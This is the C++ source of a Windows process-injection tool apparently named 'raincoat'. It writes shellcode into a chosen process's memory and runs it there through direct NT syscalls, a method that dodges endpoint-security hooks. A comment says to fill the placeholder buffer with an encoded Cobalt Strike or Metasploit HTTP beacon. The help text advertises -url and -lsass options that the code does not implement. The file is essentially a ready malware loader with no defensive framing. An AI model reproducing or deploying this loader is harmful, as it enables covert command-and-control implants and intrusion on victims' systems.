#include <iostream>
#include <fstream>
#include <string.h>
#include "syscalls.h"
#include <stdio.h>
#include <wininet.h>
#include <windows.h>
#include <dbghelp.h>
#include <tlhelp32.h>
#define UNICODE 1
#pragma comment(lib, "ntdll")
#pragma comment(lib, "wininet.lib")
#pragma warning(disable : 4996) 
char shellcode[5000];



int injectShellcode(int PID, char* shellcode, size_t shellsize) {
    LPVOID allocation_start;
    STARTUPINFO si;
    PROCESS_INFORMATION pi;
    LPCSTR cmd;
    SIZE_T RegionSize = (SIZE_T)shellsize;
    HANDLE hThread;
    HANDLE procHandle;
    SIZE_T            wr;
    OBJECT_ATTRIBUTES oa = { sizeof(oa) };
    LARGE_INTEGER     li;
    PVOID            ds = NULL;



    if (PID != 0) {
        printf("[*] Injecting into remote process using direct syscalls\n\n");
        procHandle = OpenProcess(PROCESS_ALL_ACCESS, FALSE, PID);
        NtAllocateVirtualMemory(procHandle, &ds, 0, &RegionSize, MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);
        NtWriteVirtualMemory(procHandle, ds, shellcode, shellsize, &wr);
        NtCreateThreadEx(&hThread, THREAD_ALL_ACCESS, &oa, procHandle, ds, ds, FALSE, 0, 0, 0, NULL);
        if (hThread != NULL) {

            li.QuadPart = INFINITE;
            NtWaitForSingleObject(hThread, FALSE, &li);
            LPVOID* ds = NULL;
            NtClose(hThread);
            NtFreeVirtualMemory(procHandle, ds, 0, MEM_RELEASE | MEM_DECOMMIT);
            NtClose(procHandle);
            printf("[+] Injected into remote process\n\n");

            return 0;
        }
    }

}




int main(int argc, char* argv[]) {
    using namespace std::literals;

    printf("\nraincoat by liz & ellyysium \n\n");
    printf("\n@ellyysium & @realhaxorleet \n\n");
    int PID = 0;
    if (argc < 2) {
        printf("[-] Error: No flags given. Use -h to view help page\n");
        return 0;
    }

    for (int i = 0; i < argc; i++) {
        if (strcmp(argv[i], "-h") == 0) {
            printf("Usage: raincoat.exe -url <url with raw shellcode> [-lsass | -pid <num>]\n\n");
            printf("-pid <num>: inject into remote process given PID\n");
            return 0;
        }

        if (strcmp(argv[i], "-pid") == 0) {
            PID = atoi(argv[i + 1]);
        }
        else if (argv[i] == NULL) {
            printf("you should setup a pid\n");
            return -1;
        }


    }
    char shellcode[5000] = "shellcode_here"; // cobalt strike http stageless beacon + shikata ga nai or metasploit http stageless + shikata ga nai encode
    injectShellcode(PID, shellcode, sizeof(shellcode));

    return 0;
}
